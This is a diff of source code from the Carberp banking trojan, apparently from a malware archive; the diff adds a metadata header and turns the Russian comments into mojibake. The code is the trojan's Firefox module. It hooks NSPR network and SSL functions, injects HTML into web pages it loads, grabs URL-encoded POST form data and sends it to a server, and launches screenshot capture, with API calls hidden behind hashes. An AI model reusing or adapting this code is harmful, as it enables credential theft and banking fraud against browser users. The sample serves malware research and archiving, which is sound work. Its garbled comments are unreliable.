@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -24,27 +35,27 @@
 
 #include <nspr/prtypes.h>
 
-// Зарезервируем имя для объявления функций nspr4 апи
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ nspr4 пїЅпїЅпїЅ
 #define NSPR_API 
 
 
-// Для избежания затрат процесорного времени при поиске функций в загруженных
-// библиотеках кешируем найденные результаты
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 const DWORD ApiCasheSize = 4;
 LPVOID ApiCashe[ApiCasheSize] = {NULL};
 
 bool InitMozillaApiCashe()
 {
-	// Инициализировать кэш апи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ
 	m_memset(&ApiCashe, 0, ApiCasheSize * sizeof(DWORD));
 	return true;
 }
 
 // bool ACI = InitApiCashe();
 
-/* Шаблоны для доступа к API */
+/* пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ API */
 
-// Шаблон для инициализации функций без параметров
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash>
 inline LPVOID pushargEx2()
 {
@@ -58,7 +69,7 @@ inline LPVOID pushargEx2()
 	return func();
 }
 
-// Шаблон для инициализации функций с одним параметром
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash, class A>
 inline LPVOID pushargEx2(A a1)
 {
@@ -72,7 +83,7 @@ inline LPVOID pushargEx2(A a1)
 	return func(a1);
 }
 
-// Шаблон для инициализации функций с двумя парaметрами
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅaпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B>
 inline LPVOID pushargEx2(A a1, B b1)
 {
@@ -86,7 +97,7 @@ inline LPVOID pushargEx2(A a1, B b1)
 	return func(a1, b1);
 }
 
-// Шаблон для инициализации функций с тремя парaметрами
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅaпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C>
 inline LPVOID pushargEx2(A a1, B b1, C c1)
 {
@@ -100,7 +111,7 @@ inline LPVOID pushargEx2(A a1, B b1, C c1)
 	return func(a1, b1, c1);
 }
 
-// Описываем функции для работы с библиотекой Mozile FireFox;
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Mozile FireFox;
 #define pPR_GetError				pushargEx2<0, 10, 0x1D3347F>
 #define pPR_MillisecondsToInterval	pushargEx2<1, 10, 0x5BF9111>
 #define pPR_Poll					pushargEx2<2, 10, 0xFA1AB4F9>
@@ -111,7 +122,7 @@ inline LPVOID pushargEx2(A a1, B b1, C c1)
 //#define pPR_GetConnectStatus		pushargEx<10,0xA4989C58>
 
 
-/* Описания констант */
+/* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */
 char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};
 
 
@@ -158,7 +169,7 @@ PCONNECT	PR_ConnectReal;
 PSSLIMPORTFD SSL_ImportFDReal;
 
 
-//     Глобальные данные
+//     пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 PREQUEST pStructHead;
 PCHAR FFUserAgent;
@@ -318,24 +329,24 @@ char *GetHttpInfo( char *String, char *Buffer )
 
 bool UpdateContentLength(PREQUEST Request, bool FreeOldBuf)
 {
-	// Функция обновляет заголовок "Content-Length" в заголовках HTTP запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "Content-Length" пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char * Buffer = (char *)Request->pBuf;
 
-	// копируем HTTP заголовок
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int HeaderOffset = m_istrstr(Buffer, "\r\n\r\n" );
 
 	if (HeaderOffset == -1)
 		return false;
 
-	HeaderOffset += 4; // увеличиваем размер заголовка на "\r\n\r\n"
+	HeaderOffset += 4; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ "\r\n\r\n"
 
 	PCHAR Header = StrNew(Buffer, HeaderOffset);
 	if (Header == NULL)
 		return false;
 
-	// Лпределяем позицию параметра в заголовках
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	m_lstrlwr(Header); // приводим заголовок к нижнему регистру
+	m_lstrlwr(Header); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char CL[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};
 
 	int Pos = m_istrstr(Header, CL);
@@ -343,14 +354,14 @@ bool UpdateContentLength(PREQUEST Request, bool FreeOldBuf)
 	if (Pos == -1)
 		return false;
 
-	// Копируем оригинальный заголовок
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD ParamLen = m_lstrlen(CL);
 	char *ParamName = (char*)MemAlloc(ParamLen + 1);
 	if (ParamName == NULL)
 		return false;
 	m_memcpy(ParamName, Buffer + Pos, ParamLen);
 
-	// Создаём строку с новым значением
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD NewValue = m_lstrlen(Buffer + HeaderOffset);
 	char NewContentLen[10];
 
@@ -358,13 +369,13 @@ bool UpdateContentLength(PREQUEST Request, bool FreeOldBuf)
 	fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
 	pwsprintfA(NewContentLen, "%d", NewValue);
 
-	// Вписываем новое значение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char *NewBuffer = NULL;
 
 	bool Result = SubstituteText(Buffer, 0, &NewBuffer, ParamName, NewContentLen, "\r\n") >= 0;
 	MemFree(ParamName);
 
-	// Меняем буфер запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Result)
 	{
 		if (FreeOldBuf)
@@ -381,26 +392,26 @@ bool UpdateContentLength(PREQUEST Request, bool FreeOldBuf)
 
 bool DoInjectFF(PREQUEST Request)
 {
-    // Обрабатываем загруженные данные
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	char *NewBuffer;
 
-	bool Changed = false; // Признак сработавшего инжекта
+	bool Changed = false; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool FreeBuf = false;
-	THTTPSessionInfo Session; // Описание сессии
+	THTTPSessionInfo Session; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	Session.BrowserType = BROWSER_TYPE_FF;
 	Session.UserAgent = FFUserAgent;
 	Session.URL = Request->Url;
 
-    // перебираем все маски для загруженного сайта
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	for (DWORD i = 0; i < Request->dwInjCount; i++ )
 	{		
 		if ( HandleHTML((char*)Request->pBuf, NewBuffer, &Request->pInject[i], &Session))
 		{
 			Changed = true;
 
-			// Если в исходный код были внесены изменения то заменяем старый
-			// буффер на новый
+			// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if (NewBuffer != NULL)
 			{
 				if (FreeBuf)
@@ -491,7 +502,7 @@ bool FindHash( DWORD dwHash )
 //----------------------------------------------------------------------------
 void UpdateFFUserAgent(PCHAR Request)
 {
-    // Получаем имя агента
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (FFUserAgent == NULL)
     	FFUserAgent = GetHTTPHeaderValue(Request, ParamUserAgent);
 }
@@ -500,16 +511,16 @@ void UpdateFFUserAgent(PCHAR Request)
 
 bool ProcessPostData(PREQUEST pReq, PCHAR Optional)
 {
-	// Обработать POST данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Проверяем библиотеку ScreenShot
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ScreenShot
 	if ( CalcHash(Optional) == 0x24DE3210 )
 	{
 		StartThread( ScreensThread, NULL );
 		return true;
 	}
 
-	// Отправляем данные формы на сервер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR SendBuf = StrNew(3, pReq->Url, "?|POST:", Optional);
 	if (SendBuf == NULL)
 		return false;
@@ -522,11 +533,11 @@ bool ProcessPostData(PREQUEST pReq, PCHAR Optional)
 bool MakeInfo( PREQUEST pReq, PCHAR buf, int len )
 {
 
-	// Собираем информацию об отправляемом запросе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR MethodName;
 	PCHAR Path;
 
-	// Разбираем тип запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (!ParseRequestFirstLine(buf, &MethodName, &Path, NULL))
 		return false;
@@ -540,7 +551,7 @@ bool MakeInfo( PREQUEST pReq, PCHAR buf, int len )
 		return false;
 	}
 
-	// Собираем URL
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL
 	PCHAR Host = GetHTTPHeaderValue(buf, ParamHost);
 
 	PCHAR Protocol = ProtocolHTTP;
@@ -552,7 +563,7 @@ bool MakeInfo( PREQUEST pReq, PCHAR buf, int len )
     if (pReq->Url == NULL) return false;
 
 
-	// Проверяем POST данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (pReq->dwVerb == hmPOST)
 	{
 		UpdateFFUserAgent(buf);
@@ -560,14 +571,14 @@ bool MakeInfo( PREQUEST pReq, PCHAR buf, int len )
 		DWORD HeaderHash = CalcHash(buf);
 		if (FindHash(HeaderHash)) return true;
 
-        // Проверяем тип контента
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR CT = GetHTTPHeaderValue(buf, ParamContentType);
 		DWORD Hash = CalcHash(CT);
 		StrFree(CT);
 		if (Hash != 0x6B3CDFEC) /* url_encoded*/
 			return true;
 
-		// Обрабатываем пост данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR Optional = GetURLEncodedPostData(buf);
         pReq->Optional = Optional;
 		if (Optional != NULL && ProcessPostData(pReq, Optional))
@@ -735,7 +746,7 @@ bool MakeInfo( PREQUEST pReq, PCHAR buf, int len )
 
 PRInt32 PR_WriteHook( PRFileDesc *fd, const void* buf, PRInt32 amount )
 {
-	//  Метод отправки данных на сервер
+	//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PREQUEST pReq = FindRequestByFd( fd );
 
 	if ( pReq != NULL )
@@ -866,7 +877,7 @@ int GetSize( char *Buffer, LPDWORD dwSize )
 
 int MyReadRoutine(PREQUEST pReq)
 {
-	// Функция полностью читает файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     DWORD BufSize = 4096;
 	LPVOID bufp = MemAlloc(BufSize);
 
